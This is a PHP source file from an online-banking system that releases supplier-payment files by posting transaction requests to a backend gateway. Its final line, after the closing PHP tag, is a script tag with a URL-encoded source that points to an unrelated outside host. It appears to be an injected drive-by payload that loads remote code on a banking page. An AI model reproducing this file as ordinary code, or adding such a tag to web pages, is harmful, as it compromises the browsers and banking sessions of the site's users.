<?php
//
// Liberación de Archivos de Pago a Proveedores
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );

$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;


include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();

// DebugBreak();

if ( $user )
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "LibPP.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "LibPP_tpl" => "LibPP.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $particularFields = "";

//HB
	if(!empty($_POST['Access']))
		$Access = $_POST['Access'];
	
	if(!empty($_POST['DiasPzo']))
		$DiasPzo = $_POST['DiasPzo'];
		
	if(!empty($_POST['Accion']))
		$Accion = $_POST['Accion'];
		
	if(!empty($_POST['FrAccount']))
		$FrAccount = $_POST['FrAccount'];
		
	if(!empty($_POST['ToAccount']))
		$ToAccount = $_POST['ToAccount'];
		
	if(!empty($_POST['Parent1']))
		$Parent1 = $_POST['Parent1'];
		
	if(!empty($_POST['Parent2']))
		$Parent2 = $_POST['Parent2'];
		
	if(!empty($_POST['AgruPagIni']))
		$AgruPagIni = $_POST['AgruPagIni'];
		
	if(!empty($_POST['code']))
		$code = $_POST['code'];
//HB

    if(empty($Access)) {
        $Access = "FrAc";
    }
    $Accion  = "LibArcPP";

	switch($Access) {
    case "FrAc":
        if (isset($Access)) {
            setcookie ( "QueAccess", $Access, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
        }
        if (isset($Accion)) {
            setcookie ( "QueAccion", $Accion, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
        }

	 if ( $Agrupa=="Aceptar" )
	 {
			$Access = "FrAc";
			$Accion  = "LibArcPP";
      	  	$DiasPzo = "";
	  	    $particularFields = "&Accion=".urlencode($Accion)."&FrAccount=".urlencode($FrAccount)."&AgruPagIni=".urlencode($AgruPagIni);
      	 	$tr->blog($qki,"LibArcPP", $FrAccount, $ToAccount, $DiasPzo, $Parent1, $Accion);
	  	    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=arc&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // intercambio de archivos de Pago a Proveedores
      	 	$t->set_var( "transaccion_buffer", $transaccion_buffer );
	  	    $t->pparse( "output", "LibPP_tpl" );
	 }
	 else
	 {
        	$DiasPzo = "";
	       	$particularFields = "&Accion=".urlencode($Accion)."&FrAccount=".urlencode($FrAccount)."&AgruPagIni=".urlencode($AgruPagIni);
       		$tr->blog($qki,"LibArcPP", $FrAccount, $ToAccount, $DiasPzo, $Parent1, $Accion);
	   	    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=arc&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // intercambio de archivos de Pago a Proveedores
      	 	$t->set_var( "transaccion_buffer", $transaccion_buffer );
	  	    $t->pparse( "output", "LibPP_tpl" );
	 }
        break;
    case "Confirm":
    case "Process":
        if (isset($Access)) {
            setcookie ( "QueAccess", $Access, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
        }
        if (isset($Accion)) {
            setcookie ( "QueAccion", $Accion, time() + ( 3600 * 24 * 365 ), "/",  "bb.com.mx", 0 ) or print( "Error: could not set cookie." );
        }
        //include( "eztransaccion/user/myfileupload.php" );
        list( $servicio, $ciudad, $empresa, $rowno, $nombre_esperado ) = explode("-", $DiasPzo);
		switch( $servicio ) {
			   case "pgprov1" :
			   case "pgprov2" :
					$servicio = "pgprov";
					$Parent1  = "00";
					//$result = valida_pago_proveedores_mismo_banco( $uploadedFile, $nombre_esperado );
					//$uploadedFile->OriginalFileName = $nombre_esperado;
					$mt = "fortiz@bb.com.mx,ablanco@bb.com.mx";
					break;
			  case "pgprov3" :
					$servicio = "pgprov";
					$Parent1  = "00";
					//$result = valida_pago_proveedores_mismo_banco( $uploadedFile, $nombre_esperado );
					//$uploadedFile->OriginalFileName = $nombre_esperado;
					$mt = "fortiz@bb.com.mx,ablanco@bb.com.mx";
					break;
				default:
					$mt = "helpdesk@bb.com.mx";
					break;
		}

        $particularFields = "&Passwd=".encrypt( $code, strtolower( $usr ) )."&Accion=".urlencode($Accion)."&Parent1=".urlencode($Parent1)."&Parent2=".urlencode($Parent2)."&DiasPzo=".urlencode($DiasPzo);
        $tr->blog($qki,"ArchServ", $FrAccount, $ToAccount, $DiasPzo, $Parent1, $Accion);

        $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=arc&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // intercambio de archivos de nómina electrónica

        $t->set_var( "transaccion_buffer", $transaccion_buffer );
        $t->pparse( "output", "LibPP_tpl" );

        break;
    }
} else {
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/LibPP/" );
    $t->pparse( "output", "user_login_tpl" );
}

?>

<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>